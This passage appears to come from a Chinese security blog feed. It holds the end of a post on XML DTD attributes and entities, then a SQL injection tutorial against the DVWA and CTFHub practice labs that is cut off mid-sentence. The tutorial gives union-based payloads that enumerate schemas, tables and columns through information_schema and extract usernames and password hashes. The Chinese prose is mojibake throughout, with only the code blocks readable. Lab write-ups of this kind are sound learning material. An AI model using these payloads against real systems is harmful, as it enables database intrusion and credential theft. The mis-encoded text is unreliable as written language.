align="left">å€¼æ˜¯ä¸€ä¸ªå®ä½“åˆ—è¡¨</td></tr><tr><td align="left">NOTATION</td><td align="left">æ­¤å€¼æ˜¯ç¬¦å·çš„åç§°</td></tr><tr><td align="left">xml:</td><td align="left">å€¼æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„ XML å€¼</td></tr></tbody></table><p>é»˜è®¤å€¼å‚æ•°å¯ä½¿ç”¨ä¸‹åˆ—å€¼ï¼š</p><table><thead><tr><th align="left">å€¼</th><th align="left">è§£é‡Š</th></tr></thead><tbody><tr><td align="left">å€¼</td><td align="left">å±æ€§çš„é»˜è®¤å€¼</td></tr><tr><td align="left">#REQUIRED</td><td align="left">å±æ€§å€¼æ˜¯å¿…éœ€çš„</td></tr><tr><td align="left">#IMPLIED</td><td align="left">å±æ€§ä¸æ˜¯å¿…éœ€çš„</td></tr><tr><td align="left">#FIXED value</td><td align="left">å±æ€§å€¼æ˜¯å›ºå®šçš„</td></tr></tbody></table><p>ğŸŒ°â€“è§„å®šä¸€ä¸ªé»˜è®¤çš„å±æ€§å€¼</p><p>DTD: ç»™squareå…ƒç´ è§„å®šäº†ä¸€ä¸ªé»˜è®¤å€¼ä¸º0çš„widthå±æ€§,â€squareâ€ è¢«å®šä¹‰ä¸ºå¸¦æœ‰ CDATA ç±»å‹çš„ â€œwidthâ€ å±æ€§çš„ç©ºå…ƒç´ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT square EMPTY&gt;<br>&lt;!ATTLIST square width CDATA &quot;0&quot;&gt;<br></code></pre></td></tr></table></figure><p>åˆæ³•çš„ XML: ä»å¯ä»¥ç»™è¢«é¢„å®šä¹‰çš„å±æ€§èµ‹å€¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">square</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="IMPLIED"><a href="#IMPLIED" class="headerlink" title="#IMPLIED"></a>#IMPLIED</h3><p>å±æ€§ä¸æ˜¯å¿…éœ€çš„</p><h4 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ #IMPLIED&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST contact fax CDATA #IMPLIED&gt;<br></code></pre></td></tr></table></figure><p>åˆæ³•çš„ XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">contact</span> <span class="hljs-attr">fax</span>=<span class="hljs-string">&quot;555-667788&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>åˆæ³•çš„ XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">contact</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="REQUIRED"><a href="#REQUIRED" class="headerlink" title="#REQUIRED"></a>#REQUIRED</h3><p>å±æ€§æ˜¯å¿…éœ€çš„,é€‚ç”¨äºæ²¡æœ‰é»˜è®¤å€¼é€‰é¡¹ï¼Œä½†å¼ºåˆ¶è¦æ±‚æäº¤å±æ€§å€¼</p><h3 id="è¯­æ³•-3"><a href="#è¯­æ³•-3" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ #REQUIRED&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST person number CDATA #REQUIRED&gt;<br></code></pre></td></tr></table></figure><p>åˆæ³•çš„ XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> <span class="hljs-attr">number</span>=<span class="hljs-string">&quot;5677&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>éæ³•çš„ XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="FIXED"><a href="#FIXED" class="headerlink" title="#FIXED"></a>#FIXED</h3><p>å±æ€§å€¼å›ºå®š,é¢„å…ˆå®šä¹‰å±æ€§å€¼ï¼Œä¸å¯æ›´æ”¹(ç±»æ¯”const)</p><h3 id="è¯­æ³•-4"><a href="#è¯­æ³•-4" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° å±æ€§ç±»å‹ #FIXED &quot;value&quot;&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST sender company CDATA #FIXED &quot;Microsoft&quot;&gt;<br></code></pre></td></tr></table></figure><p>åˆæ³•çš„ XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span> <span class="hljs-attr">company</span>=<span class="hljs-string">&quot;Microsoft&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>éæ³•çš„ XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span> <span class="hljs-attr">company</span>=<span class="hljs-string">&quot;W3School&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="åˆ—ä¸¾å±æ€§å€¼"><a href="#åˆ—ä¸¾å±æ€§å€¼" class="headerlink" title="åˆ—ä¸¾å±æ€§å€¼"></a>åˆ—ä¸¾å±æ€§å€¼</h3><h3 id="è¯­æ³•ï¼š"><a href="#è¯­æ³•ï¼š" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST å…ƒç´ åç§° å±æ€§åç§° (en1|en2|..) é»˜è®¤å€¼&gt;<br></code></pre></td></tr></table></figure><p>DTD ä¾‹å­:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST payment type (check|cash) &quot;cash&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML ä¾‹å­:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;check&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;cash&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="å®ä½“å£°æ˜"><a href="#å®ä½“å£°æ˜" class="headerlink" title="å®ä½“å£°æ˜"></a>å®ä½“å£°æ˜</h2><p>å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚</p><p>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p><p>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p><h3 id="å†…éƒ¨å®ä½“å£°æ˜"><a href="#å†…éƒ¨å®ä½“å£°æ˜" class="headerlink" title="å†…éƒ¨å®ä½“å£°æ˜"></a>å†…éƒ¨å®ä½“å£°æ˜</h3><h3 id="è¯­æ³•ï¼š-1"><a href="#è¯­æ³•ï¼š-1" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;<br></code></pre></td></tr></table></figure><p>ğŸŒ°</p><p>DTD ä¾‹å­:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;<br>&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML ä¾‹å­:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· <code>&amp;</code>, ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· <code>;</code></p></blockquote><h3 id="å¤–éƒ¨å®ä½“å£°æ˜"><a href="#å¤–éƒ¨å®ä½“å£°æ˜" class="headerlink" title="å¤–éƒ¨å®ä½“å£°æ˜"></a>å¤–éƒ¨å®ä½“å£°æ˜</h3><h3 id="è¯­æ³•ï¼š-2"><a href="#è¯­æ³•ï¼š-2" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt; &lt;!--ä¹Ÿå¯ä»¥ç”¨åè®®--&gt;<br></code></pre></td></tr></table></figure><p>ğŸ’¡ä¸åŒç¯å¢ƒä¸‹å¯ç”¨åè®®</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032236978.jpg" alt="aaa"></p><p>ğŸŒ°</p><p>DTD ä¾‹å­:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;<br>&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML ä¾‹å­:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å®ä½“çš„åµŒå¥—"><a href="#å®ä½“çš„åµŒå¥—" class="headerlink" title="å®ä½“çš„åµŒå¥—"></a><strong>å®ä½“çš„åµŒå¥—</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY %å®ä½“åç§° &quot;å€¼&quot;&gt; &lt;!--å†…éƒ¨--&gt;<br>&lt;!ENTITY %å®ä½“åç§° SYSTEM &quot;URL&quot;&gt; &lt;!--å¤–éƒ¨--&gt;<br></code></pre></td></tr></table></figure><h3 id="å®ä½“åˆ†ç±»"><a href="#å®ä½“åˆ†ç±»" class="headerlink" title="å®ä½“åˆ†ç±»"></a>å®ä½“åˆ†ç±»</h3><p>å®ä½“åˆåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“,å­—ç¬¦å®ä½“,å‘½åå®ä½“</p><p>1ï¼Œä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•:<!ENTITY å®ä½“å "å®ä½“å†…å®¹"><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“åï¼›</p><p>2ï¼Œå‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š <!ENTITY % å®ä½“å "å®ä½“å†…å®¹"><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“åï¼›</p><blockquote><p>æœ‰SYSTEMå…³é”®å­—å¼•ç”¨æ•°æ®çš„å®ä½“å°±æ˜¯å‚æ•°å®ä½“</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥å­¦ä¹ </title>
      <link href="/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥åŸç†"><a href="#SQLæ³¨å…¥åŸç†" class="headerlink" title="SQLæ³¨å…¥åŸç†"></a>SQLæ³¨å…¥åŸç†</h1><h2 id="ä¸€ã€å®šä¹‰"><a href="#ä¸€ã€å®šä¹‰" class="headerlink" title="ä¸€ã€å®šä¹‰"></a>ä¸€ã€å®šä¹‰</h2><p>SQLæ³¨å…¥æ˜¯æŒ‡åœ¨åˆ¤æ–­å‡ºæ³¨å…¥ç‚¹åï¼Œå°†<strong>æ¶æ„çš„SQLè¯­å¥</strong>æ·»åŠ åˆ°è¾“å…¥å‚æ•°ä¸­ï¼Œä½¿å¾—åå°æœåŠ¡å™¨<u>æ‰§è¡Œæ·»åŠ çš„SQLè¯­å¥</u>ï¼Œä»è€Œè¾¾åˆ°çªƒå–ç½‘ç«™æ•æ„Ÿä¿¡æ¯ç­‰ç›®çš„</p><h2 id="äºŒã€å®ä¾‹åŠåŸç†"><a href="#äºŒã€å®ä¾‹åŠåŸç†" class="headerlink" title="äºŒã€å®ä¾‹åŠåŸç†"></a>äºŒã€å®ä¾‹åŠåŸç†</h2><h3 id="2-1å­—ç¬¦å‹æ³¨å…¥-dvwaå¹³å°sqlæ³¨å…¥ç®€å•çº§åˆ«"><a href="#2-1å­—ç¬¦å‹æ³¨å…¥-dvwaå¹³å°sqlæ³¨å…¥ç®€å•çº§åˆ«" class="headerlink" title="2.1å­—ç¬¦å‹æ³¨å…¥(dvwaå¹³å°sqlæ³¨å…¥ç®€å•çº§åˆ«)"></a>2.1å­—ç¬¦å‹æ³¨å…¥(dvwaå¹³å°sqlæ³¨å…¥ç®€å•çº§åˆ«)</h3><h4 id="æŸ¥çœ‹å›æ˜¾"><a href="#æŸ¥çœ‹å›æ˜¾" class="headerlink" title="æŸ¥çœ‹å›æ˜¾"></a>æŸ¥çœ‹å›æ˜¾</h4><p>è¾“å…¥ç”¨æˆ·idä¸º1ï¼Œå‘ç°URLä¸­ä¹Ÿå‡ºç°ID&#x3D;1ï¼Œè¯´æ˜ä½¿ç”¨getæ–¹å¼ä¼ å‚æ•°ï¼ŒæŸ¥çœ‹å›æ˜¾ï¼Œè¿”å›äº†IDä¸º1çš„ç”¨æˆ·ä¿¡æ¯<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221760.png" alt="1"></p><h4 id="å®¡è®¡æºä»£ç "><a href="#å®¡è®¡æºä»£ç " class="headerlink" title="å®¡è®¡æºä»£ç "></a>å®¡è®¡æºä»£ç </h4><ul><li>å‘ç°ä¸»è¦æ‰§è¡Œçš„SQLè¯­å¥ä¸º:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><blockquote><p>ç±»ä¼¼è¿™ç±»ä¼ å…¥å‚æ•°ä»¥<code>&#39;</code>åŒ…è£¹çš„ç§°ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œå¯ä»¥é€šè¿‡ä¼ å…¥ <code>1&#39; xxx#</code>(xxxä¸ºæ¶æ„çš„SQLè¯­å¥)çš„æ–¹å¼æ¥æ‰§è¡Œæ¶æ„çš„SQLè¯­å¥<br><strong>åŸå› </strong>:</p><ul><li>æ•°å­—åè·Ÿçš„<code>&#39;</code>ä¸æºç ä¸­$idå‰çš„<code>&#39;</code>ä¼˜å…ˆåŒ¹é…ï¼Œåé¢çš„SQLè¯­å¥åªè¦ç”¨unionä¸å‰é¢çš„SELECTè¯­å¥è¿æ¥ï¼Œå°±å¯ä»¥åšåˆ°è®©åå°æœåŠ¡å™¨æ‰§è¡Œèƒ½è¾¾åˆ°æ”»å‡»ç›®çš„çš„SQLè¯­å¥ã€‚</li><li>æœ€åçš„<code>#</code>ä½œç”¨æ˜¯å°†è¯­å¥ç»“å°¾çš„<code>&#39;</code>å’Œ<code>;</code>æ³¨é‡Šæ‰ï¼Œå°†<code>&#39;</code>æ³¨é‡Šæ‰æ˜¯ä¸ºäº†é˜²æ­¢è¯­æ³•é”™è¯¯ï¼Œå¹¶ä¸”å¯¹äºå•å¥SQLè¯­å¥å³ä½¿æ²¡æœ‰<code>;</code>ä¹Ÿå¯ä»¥æ­£å¸¸æ‰§è¡Œ</li></ul></blockquote><ul><li>å›æ˜¾éƒ¨åˆ†çš„ä»£ç ä¸º:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>    <span class="hljs-comment">// Get values</span><br>    <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>    <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br/&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br/&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ç”±äºä½¿ç”¨whileå¾ªç¯ï¼Œå¯ä»¥çŒœæƒ³åˆ°å¦‚æœæ‰§è¡Œçš„SQLè¯­å¥unionä¸Šåˆ«çš„SQLè¯­å¥(è”åˆæŸ¥è¯¢)ï¼Œåªè¦æŸ¥è¯¢çš„å­—æ®µæ•°å’Œç±»å‹ç›¸åŒï¼Œæ¯ä¸€è¡Œçš„æ•°æ®éƒ½å¯ä»¥è¢«å›æ˜¾å‡ºæ¥</p></blockquote><h4 id="åˆ¤æ–­åˆ—æ•°"><a href="#åˆ¤æ–­åˆ—æ•°" class="headerlink" title="åˆ¤æ–­åˆ—æ•°"></a>åˆ¤æ–­åˆ—æ•°</h4><p>SQLè¯­è¨€ä¸­<code>order by</code>å…³é”®å­—ç”¨äºç»™æŸ¥è¯¢çš„è¡¨æ·»åŠ æ’åºæ¡ä»¶å¹¶ä¸”å¤„äºSELECTè¯­å¥æœ«å°¾ï¼Œæ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬å¹¶ä¸çŸ¥é“æŸ¥è¯¢ç»“æœçš„å­—æ®µåï¼Œä½†å¯ä»¥åœ¨<code>order by</code>åç›´æ¥è·Ÿæ•°å­—1è¡¨ç¤ºæŒ‰ç¬¬ä¸€å­—æ®µæ’åºï¼Œç”¨æ­¤æ–¹å¼å‘ç°åœ¨è¾“å…¥ <code>1&#39; and order by 3#</code>æ—¶å‘ç”Ÿé”™è¯¯ï¼Œå› æ­¤å¾—çŸ¥æŸ¥è¯¢ç»“æœæ€»åˆ—æ•°ä¸º2,è¿™è¡¨ç¤ºä¹‹åunion åçš„selectè¯­å¥ä»…ä»…åªèƒ½æŸ¥è¯¢<strong>ä¸¤ä¸ªå­—æ®µ</strong><br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221721.png" alt="1"></p><h4 id="è·å–åº“åã€è¡¨åã€å­—æ®µå"><a href="#è·å–åº“åã€è¡¨åã€å­—æ®µå" class="headerlink" title="è·å–åº“åã€è¡¨åã€å­—æ®µå"></a>è·å–åº“åã€è¡¨åã€å­—æ®µå</h4><ul><li>è·å–åº“å,è¦æƒ³è·å–å…³é”®ä¿¡æ¯ï¼Œå¾—çŸ¥é“åº“åã€è¡¨åã€å­—æ®µåï¼Œåˆ©ç”¨user()å’Œdatabase()å‡½æ•°åˆ†åˆ«è·å–ç”¨æˆ·åå’Œæ•°æ®åº“åç§°<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221259.png" alt="1"></li></ul><blockquote><p>ç”±äºè¯¥æƒ…æ™¯ä¸‹unionåçš„selectè¯­å¥å¿…é¡»æœ‰ä¸¤ä¸ªå­—æ®µï¼Œè¿™é‡Œä¸»è¦è·å–æ•°æ®åº“åç§°ï¼Œuser()å¯ä»¥æ›¿æ¢æˆå…¶ä»–å‡½æ•°æˆ–è€…å¸¸é‡ç­‰ç­‰éƒ½å¯ä»¥</p><h3 id="è·å–æ‰€æœ‰åº“å"><a href="#è·å–æ‰€æœ‰åº“å" class="headerlink" title="è·å–æ‰€æœ‰åº“å"></a>è·å–æ‰€æœ‰åº“å</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> group_concat(schema_name) <span class="hljs-keyword">FROM</span> information_schema.schemata<br></code></pre></td></tr></table></figure></blockquote><ul><li>è·å–è¡¨å,è¿™è¾¹éœ€è¦äº†è§£åˆ°<code>information_schema</code>æ˜¯mysqlè‡ªå¸¦çš„æ•°æ®åº“ï¼Œå…¶ä¸­åä¸º<code>tables</code>çš„è¡¨ä¸­çš„ä¸¤ä¸ªå­—æ®µ<code>table_name</code>å’Œ<code>table_schema</code>è®°å½•äº†DBMSä¸­çš„å­˜å‚¨çš„è¡¨åå’Œè¡¨åæ‰€åœ¨çš„æ•°æ®åº“ã€‚ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº†æ•°æ®åº“åç§°ä¸º<code>dvwa</code>ï¼Œå¯ä»¥åŠ å…¥WHEREè¿›è¡Œæ¡ä»¶æŸ¥è¯¢,æœ€ç»ˆåå°æœåŠ¡å™¨è¿è¡Œçš„SQLè¯­å¥ä¸º:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">union</span><br><span class="hljs-keyword">select</span> table_name, table_schema <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>å¾—åˆ°è¡¨åæœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«ä¸º<code>guestbook</code>å’Œ <code>users</code>ï¼Œæ ¹æ®ç»éªŒåˆ¤æ–­ç½‘ç«™æ•æ„Ÿä¿¡æ¯å­˜å‚¨åœ¨usersè¡¨ä¸­</p></blockquote><ul><li><p>è·å–å­—æ®µåï¼Œ<code>information_schema</code>ä¸­æœ‰ä¸€å¼ åä¸º<code>columns</code>çš„è¡¨ï¼Œå…¶ä¸­<code>column_name</code>å­˜å‚¨äº†å­—æ®µåï¼Œé€šè¿‡å¢åŠ æ¡ä»¶<code>table_name = &#39;users&#39;</code>ï¼ŒæˆåŠŸè·å–<code>users</code>è¡¨çš„å­—æ®µå<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221711.png" alt="1"></p></li><li><p><strong>è·å–æ•æ„Ÿä¿¡æ¯</strong>: ä»å­—æ®µåå¯çœ‹å‡ºï¼Œuserå’Œpasswordå­˜å‚¨ç€é‡è¦ä¿¡æ¯ï¼Œæ·»åŠ <code>select user, password from dvwa.users</code> å³å¯å¾—åˆ°è´¦å·åŠå¯†ç ï¼Œå¯†ç ä½¿ç”¨äº†md5åŠ å¯†<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221287.png" alt="1"></p></li></ul><h3 id="2-2-æ•´æ•°å‹æ³¨å…¥-CTFHubæŠ€èƒ½æ ‘"><a href="#2-2-æ•´æ•°å‹æ³¨å…¥-CTFHubæŠ€èƒ½æ ‘" class="headerlink" title="2.2 æ•´æ•°å‹æ³¨å…¥(CTFHubæŠ€èƒ½æ ‘)"></a>2.2 æ•´æ•°å‹æ³¨å…¥(CTFHubæŠ€èƒ½æ ‘)</h3><ul><li>è¾“å…¥1ï¼Œç”±ä¸‹æ–¹çº¢å­—æç¤ºè¾“å…¥çš„å†…å®¹æ²¡æœ‰è¢«<code>&#39;</code>åŒ…è£¹ï¼Œè¿™ç§ç§°ä¸ºæ•´æ•°å‹è¾“å…¥ï¼Œè¾“å…¥<code>1 and 1=2</code>æ²¡æœ‰å›æ˜¾ä¹Ÿå¯ä»¥éªŒè¯è¿™æ˜¯æ•´æ•°å‹æ³¨å…¥ï¼Œå› ä¸ºå¦‚æœæ˜¯å­—ç¬¦å‹ï¼Œå­—ç¬¦ä¸²â€™1 and 1&#x3D;2â€™è‡ªåŠ¨è½¬æ¢æˆæ•´æ•°1ï¼Œä»æœ‰å›æ˜¾<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221732.png" alt="1"></li></ul><blockquote><p>SQLä¸­å­—ç¬¦ä¸²è‡ªåŠ¨è½¬æ¢æˆæ•´å‹è§„å¾‹ï¼šä»å·¦è¾¹ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æ’æŸ¥èµ·ï¼Œè½¬æ¢æˆå‡ºç°çš„ç¬¬ä¸€ä¸ªéæ•°å­—å­—ç¬¦å‰çš„æ•°å­—å¯¹åº”çš„æ•´å‹ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦å°±ä¸æ˜¯æ•°å­—ï¼Œåˆ™è½¬æ¢æˆ0</p></blockquote><ul><li>ç»§ç»­ä½¿ç”¨åŒå­—ç¬¦å‹æ³¨å…¥åŒæ ·çš„æ–¹æ³•ï¼Œ<strong>åˆ¤æ–­å®Œåˆ—æ•°å</strong>åœ¨è¾“å…¥çš„IDåè·Ÿä¸Šunionè¯­å¥,å‘ç°å›æ˜¾ä»ä¸ºidä¸º1çš„ä¿¡æ¯ï¼ŒåŸå› çŒœæµ‹æ˜¯è¯¥ç½‘é¡µåªä¼šå›æ˜¾æŸ¥è¯¢ç»“æœçš„ç¬¬ä¸€è¡Œï¼Œå› 